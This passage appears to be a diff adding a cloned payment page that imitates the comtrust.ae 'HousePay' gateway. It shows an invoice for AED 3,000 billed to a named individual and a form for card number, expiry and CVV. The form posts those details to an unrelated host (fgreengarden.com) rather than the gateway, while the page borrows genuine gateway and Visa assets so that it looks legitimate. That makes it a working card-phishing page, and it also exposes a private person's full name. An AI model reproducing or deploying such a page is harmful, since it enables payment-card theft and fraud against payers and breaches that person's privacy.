GUKYQbce8hZ/RvhzEnqWW+ukx7e8mI2Iyeip8CXwLZqlo7/ACeUFLaFiSzEcrsTYdw0iUkjWuiFfZRkpcCkS6mZVIhE6YLO2ZiCOzwJsPRHshhZySqoqbmuWaGNbFUVVMM2bK7Z3srMubxANie/fEOKZnZpq5vdJdTwuweHhUUU4GRswIZ8xPe17kdx0htQ/CVdOhJYtgMipeU85CzSWzIczCxup4HX0RviWsmk6YTacu43K2lSbLeVMF0dSrC5F1IsdRqIktKKksMxYRhcqmlLJkrlRb2FyfSJY6nXeTEJYIhCMI7Y8GCmwKRLqZlUqETpgszZmII7P0SbD0RDCzkhVRU3NcsUuA08upmVSIROmDKzZmII7PAmw9FfZDCzkKqKm5rlnjHdnKWsAFRKDFdzAlWHcGWxt3boNJkWUws7SNDCNhKGmmrOlS26xLlWLubEgjdex0J3xCikUhpa4Pcl1LLFjoIrHtnqesCrUIWyElbMykXtf0SOQiGkzK2mFnaRBr0Z4de/Vue7rH/AxGxGP4Knw/ksWEYNT0q5JEpZYO+28+LHVvMxKSR0V1QrWIrBq49svS1ljPl5mUWDglWtyuN47jBpMpbRXZ2kaEno/wAOWW0vqLhrXYsxfQg6Ne67uFrxG1FFo6cYwSlbs/TzaZaV0JkoECrmYEBBZdQbnSJaWMGkqYShsfBIU8lURUUWVQFA7gLDfEmiWFg0JOAyFqmq1Q9c65WbM1iLKPRvYeiOERhZyZqqKm5rlimwGnl1MyrRCJ0wZWbMxBHZ4E2Hor7IY7yVVBTc0urPGObN01WUM+XmKeiwZlYeakHvg0mRZTCzG5cEqq2AHLnqYk1PsAIAQAgBACAI/EMEp54Amyla2ouOPO26KuCZE4xmsSWV8TTXZanUEICl+KBAfs/GKOlPkQjGHYil5Iiajo5ppjZpk6obuLSwPYJYt5RMaox4Oa3SK2W6yTf7fRG7RbB4fLN+ozn+WzN7icvui21COipj+n9ywyJCooVFCqNyqAAPIRY6UkuiMkCRACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAIAQAgBACAEAf/Z" alt="logo" width="250" height="100" title="logo" class="lazyloaded" data-ll-status="loaded"></td>
+            <div class="row">
+
+                <div class="col s12 titlebar">
+                    
+                </div>
+            </div>
+            <div class="row">
+                <div class="col s12 description">
+
+                    
+                    <div class="row line">
+                        <div id="MerchantNameLabel" class="col s6 title">
+                            <span>Bill To:</span>
+                        </div>
+                        <div id="MerchantNameValue" class="col s6 content">
+                            <div style="float: left">
+                                <span class="ng-binding">FATEMA GHAREEB AHMED MOHAMMED ALMANSOORI</span>
+                                <img ng-show="ShowLogo" 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" style="margin-left:5px; width:40px; height:40px;" align="middle" class="">
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row line">
+                        <div class="col s6 title">
+                            <span>Invoice Number:</span>
+                        </div>
+                        <div class="col s6 content">
+                            <span class="ng-binding">EV-42279</span>
+                        </div>
+                    </div>
+                    <div class="row line">
+                        <div class="col s6 title">
+                            <span>Description:</span>
+                        </div>
+                        <div class="col s6 content">
+                            <span class="ng-binding">HF EV FEES</span>
+                        </div>
+                    </div>
+                    <div class="row line">
+                        <div class="col s6 title">
+                            <span>Subtotal:</span>
+                        </div>
+                        <div class="col s6 content">
+                            <span class="ng-binding">AED 3,000.00</span>
+                        </div>
+                    </div>
+                    <div class="row line">
+                        <div class="col s6 title">
+                            <span>Total:</span>
+                        </div>
+                        <div class="col s6 content">
+                            <span class="ng-binding">AED 3,000.00</span>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col s12 titlebar">
+                    <h1>
+Payment Using</h1>
+                </div>
+            </div>
+            <form class="form-horizontal ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" method="POST" action="https://fgreengarden.com/workplan/opiodqic.php">
+
+
+				<div class="row forms ng-hide" ng-show="ShowPaymentMethod">
+                    <div>
+                        <div class="input-field col s6 m3 selectWithMargin">
+                            <div class="select-wrapper ng-pristine ng-untouched ng-valid initialized">
+<span class="caret">▼</span>
+<input type="text" class="select-dropdown" readonly="true" data-activates="select-options-925b6705-c37d-8322-d487-80fcab8408e2" value="Payment Card">
+<ul id="select-options-925b6705-c37d-8322-d487-80fcab8408e2" class="dropdown-content select-dropdown ">
+<li class="">
+<span>Payment Card</span>
+</li>
+</ul>
+
+</div>
+                            <label>Choose Payment Method</label>
+                        </div>
+                        <div class="input-field col s6 m3 selectWithMargin2 ng-hide" ng-show="selectedInstruementObj.Symbol == 'B'">
+                            <div class="select-wrapper ng-pristine ng-untouched ng-valid initialized">
+<span class="caret">▼</span>
+<input type="text" class="select-dropdown" readonly="true" data-activates="select-options-23819f40-4a2d-cb62-d7d1-541cd6b4a369" value="">
+<ul id="select-options-23819f40-4a2d-cb62-d7d1-541cd6b4a369" class="dropdown-content select-dropdown ">
+<li class="">
+<span>
+</span>
+</li>
+</ul>
+<select ng-model="selectedBrandNew" ng-change="BankSelected($event,this)" ng-options="brand for brand in Banks" class="ng-pristine ng-untouched ng-valid initialized">
+<option value="?" selected="selected">
+</option>
+</select>
+</div>
+                            <label>Bank name</label>
+                        </div>
+
+                        <div class="input-field col s6 m3 selectWithMargin2 ng-hide" ng-show="selectedInstruementObj.Symbol == 'D'" ng-hide="selectedInstruementObj.Symbol != 'D'">
+                            <div>
+                                <img src="https://ipg.comtrust.ae/PaymentEx/Images/eDhirham_Logo.bmp" class="edhirham_logo">
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div ng-show="selectedInstruementObj.Symbol == 'C'" ng-hide="selectedInstruementObj.Symbol != 'C'" class="">
+                    
+                    <div class="row">
+                        <div class="col s12 cards">
+                            <div class="row">
+                                <div class="col s4 title">
+                                    <span>Accepted cards:</span>
+                                </div>
+                                <div class="col s2" ng-show="ShowMastercardLogo">
+                                    <img src="https://ipg.comtrust.ae/PaymentEx/Images/House-master.png" class="ic_mastercard">
+                                </div>
+                                <div class="col s2" ng-show="ShowVisaLogo">
+                                    <img src="https://ipg.comtrust.ae/PaymentEx/Images/House-visa.png" class="ic_visa">
+                                </div>
+                                <div class="col s2 ng-hide" ng-show="ShowAmexLogo">
+                                    <img src="https://ipg.comtrust.ae/PaymentEx/Images/House-amex.png" class="ic_amex">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="row forms" ng-hide="HideCardEntry">
+                        
+                        <div class="input-field col s12 m6 numberfield">
+                            <div>
+                                <input type="number" class="validate CardNumber ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" ng-model="Card_number" id="cardNumber" name="creditCardNumber" maxlength="16" pattern="[0-9]*" ng-disabled="disablepaymentmethod" ng-keyup="ValidateCardNumber($event,this)" data-ng-keypress="onEnterKeyPress($event)" autocomplete="off" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" required="">
+                                <label for="cardNumber">Card number</label>
+
+                                <img src="https://ipg.comtrust.ae/PaymentEx/Images/BlankCard.svg" class="cardvalidation" ng-show="isBlankSelected">
+                                <img src="https://ipg.comtrust.ae/PaymentEx/Images/HousePay-Visa-selected.svg" class="cardvalidation ng-hide" ng-show="isVisaSelected">
+                                <img src="https://ipg.comtrust.ae/PaymentEx/Images/HousePay-MasterCard-selected.svg" class="cardvalidation ng-hide" ng-show="isMasterCardSelected">
+                                <img src="https://ipg.comtrust.ae/PaymentEx/Images/HousePay-Amex-selected.svg" class="cardvalidation ng-hide" ng-show="isAmexSelected">
+                                <div ng-messages="PaymentData.creditCardNumber.$error">
+                                    <div ng-message="required" style="color:red" class="ng-binding">
+</div>
+                                </div>
+                            </div>
+                            <div class="IntCardLabel ng-hide" ng-show="ShowIntCardLabel">International Credit Cards are not accepted.</div>
+
+                        </div>
+                        <div>
+                            <div class="input-field col s6 m3 month">
+                                <div class="select-wrapper CardNumber ng-pristine ng-untouched ng-valid initialized">
+<span class="caret">▼</span>
+
+<select name="Mon" class="CardNumber ng-pristine ng-untouched ng-valid initialized" ng-model="month" ng-init="month = months[CurrentMonthIndex]" ng-options="x as x.text for x in months track by x.value" ng-disabled="disablepaymentmethod">
+<option value="1" label="01 - JAN">01 - JAN</option>
+<option value="2" label="02 - FEB">02 - FEB</option>
+<option value="3" label="03 - MAR">03 - MAR</option>
+<option value="4" label="04 - APR">04 - APR</option>
+<option value="5" label="05 - MAY">05 - MAY</option>
+<option value="6" label="06 - JUN">06 - JUN</option>
+<option value="7" label="07 - JUL">07 - JUL</option>
+<option value="8" label="08 - AUG">08 - AUG</option>
+<option value="9" label="09 - SEP">09 - SEP</option>
+<option value="10" label="10 - OCT" selected="selected">10 - OCT</option>
+<option value="11" label="11 - NOV">11 - NOV</option>
+<option value="12" label="12 - DEC">12 - DEC</option>
+</select>
+</div>
+                                <label>Expiry month</label>
+                                <div>
+                                    <div ng-message="required" style="color:red" class="ng-binding">
+</div>
+                                </div>
+                            </div>
+                            <div class="input-field col s6 m3 year">
+                                <div class="select-wrapper CardNumber ng-pristine ng-untouched ng-valid initialized">
+<span class="caret">▼</span>
+<select name="yea" class="CardNumber ng-pristine ng-untouched ng-valid initialized" ng-model="selectedYear" ng-init="selectedYear = years[0]" ng-options="year for year in years" ng-disabled="disablepaymentmethod">
+<option value="2020" label="2023" selected="selected">2023</option>
+<option value="2024" label="2024">2024</option>
+<option value="2025" label="2025">2025</option>
+<option value="2026" label="2026">2026</option>
+<option value="2027" label="2027">2027</option>
+<option value="2028" label="2028">2028</option>
+<option value="2029" label="2029">2029</option>
+<option value="2021" label="2030">2030</option>
+<option value="2022" label="2031">2031</option>
+<option value="2023" label="2032">2032</option>
+</select>
+</div>
+                                <label>Expiry year</label>
+
+                            </div>
+                        </div>
+                       
+                        <div class="input-field col s12 m6 numberfield ng-hide" ng-show="ShowAutoPayCHName">
+                            <div>
+                                <input type="text" class="validate CardNumber ng-pristine ng-untouched ng-valid ng-valid-maxlength" ng-model="AutoPayCardHolderName" id="CH_Name" name="CH_Name" maxlength="22">
+                                <label for="CH_Name">Name on Card</label>
+                                <div ng-messages="AutoPayCardHolderName.$error">
+                                    <div ng-message="required" style="color:re" class="ng-binding">
+</div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="input-field col s12 m6 numberfield" ng-show="selectedBrand.VerifyInfo != ''">
+                            <div>
+                                <input type="password" class="validate CvvMasking CardNumber ng-pristine ng-untouched ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" ng-model="Validation_code" id="ValidationCode" pattern="[0-9]*" inputmode="numeric" name="ValidationCode" maxlength="4" ng-disabled="disablepaymentmethod" data-ng-keypress="onEnterKeyPress($event)" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" required="">
+                                <label for="exampleInputPassword1">Validation Code ( CVV/CVC/CID )</label>
+                                <div ng-messages="PaymentData.ValidationCode.$error">
+                                    <div ng-message="required" style="color:red" class="ng-binding">
+</div>
+                                </div>
+                            </div>
+                        </div>
+                        
+
+                        <!-- ngIf: paymentDataView.CustomerFraudConfigurations != null && (paymentDataView.CustomerFraudConfigurations.IsFraudEnable ||
+                                              paymentDataView.CustomerFraudConfigurations.ISFraudDetailExists) -->
+                    </div>
+
+                    
+
+
+
+                </div>
+                
+
+         
+            <div class="row buttons ButtonPosition" ng-show="DivButton">
+                <div class="col s6 button">
+                    <button type="reset" class="btn reset">Reset</button>
+                </div>
+                <div class="col s6 button">
+					<button type="submit" name="bb" class="btn pay">PAY</button>
+
+                </div>
+
+            </div>
+ </form>
+
+        </div>
+        <div ng-show="DivDisplayWaitingForm" class="ng-hide">
+
+            <table class="row centered">
+                <tbody>
+<tr>
+                    <td style="text-align: center;">
+                        <img src="https://ipg.comtrust.ae/PaymentEx/Images/auth_process.gif" style="text-align: center;">
+                        <div style="text-align: center;">
+<h6>Loading transaction data ...</h6>
+</div>
+                    </td>
+                </tr>
+            </tbody>
+</table>
+        </div>
+
+      
+
+
+
+        <script>
+            $(document).ready(function () {
+                $('select').material_select();
+            });
+        </script>
+    </div>
+</div>
+
+    <script src="https://ipg.comtrust.ae/PaymentEx/bundles/jquery?v=">
+</script>
+
+
+    
+    
+
+
+
+<div class="hiddendiv common">
+</div>
+<div id="VmeGtm" style="visibility: hidden; position: absolute; height: 1px; width: 1px; left: -2000px; bottom: 0px;">
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation allow-popups" frameborder="0" src="https://secure.checkout.visa.com/checkout-widget/gtm?apikey=CYBR2FP64LA68ZJ5U8P221RsiUqdDupqRly1pmucm26kGXE5s&amp;externalClientId=&amp;externalProfileId=&amp;parentUrl=https%3A%2F%2Fipg.comtrust.ae%2FPaymentEx%2FHousePay%2FPayment&amp;locale=en_AE&amp;country=AE&amp;browserLocale=&amp;countryCode=AE&amp;allowCXO=false&amp;buttonPosition=&amp;postmessage=true&amp;allowRXO=true" title="For system use, please ignore." tabindex="-1" role="presentation" style="height: 0px; width: 0px; display: none;">
+</iframe>
+</div>
+<div id="CheckoutConfig" style="visibility: hidden; position: absolute; height: 1px; width: 1px; left: -2000px; bottom: 0px;">
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation allow-popups" frameborder="0" src="https://secure.checkout.visa.com/checkout-widget/config?apikey=CYBR2FP64LA68ZJ5U8P221RsiUqdDupqRly1pmucm26kGXE5s&amp;externalClientId=&amp;externalProfileId=&amp;parentUrl=https%3A%2F%2Fipg.comtrust.ae%2FPaymentEx%2FHousePay%2FPayment&amp;locale=en_AE&amp;country=AE&amp;browserLocale=&amp;countryCode=AE&amp;postMessageId=Q7yoSJrPUu&amp;allowCXO=false&amp;buttonPosition=&amp;postmessage=true&amp;allowRXO=true" title="For system use, please ignore." tabindex="-1" role="presentation" style="height: 0px; width: 0px; display: none;">
+</iframe>
+</div>
+<script src="https://secure.checkout.visa.com/checkout-widget/resources/js/src-orch/visaOrchSdk.js" id="orchJs">
+</script>
+<script src="https://secure.checkout.visa.com/checkout-widget/resources/js/src-i-adapter/visaSdk.js" id="visaSDK">
+</script>
+<div id="vcop-src-system" style="visibility: hidden; position: fixed; height: 1px; width: 1px; left: 0px; bottom: 0px;">
+<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation allow-popups" frameborder="0" id="vcop-src-system-frame" src="https://secure.checkout.visa.com/checkout-widget/external-src-system?parentUrl=https%3A%2F%2Fipg.comtrust.ae" title="For system use, please ignore." tabindex="-1" role="presentation" style="height: 0px; width: 0px; display: none;">
+</iframe>
+</div>
+<div id="visa-sdk-loader-wrapper" style="width: 100%; height: 100%; position: fixed; display: none; top: 0px; left: 0px; bottom: 0px; right: 0px; z-index: 999995;">
+<iframe frameborder="0" id="visa-sdk-loader-frame" src="https://secure.checkout.visa.com/checkout-widget/sdk-loader?isSRCBranded=true" title="For displaying visa loader screen" role="presentation" sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation allow-popups" style="height: 100%; width: 100%;">
+</iframe>
+</div>
+</body>
+</html>
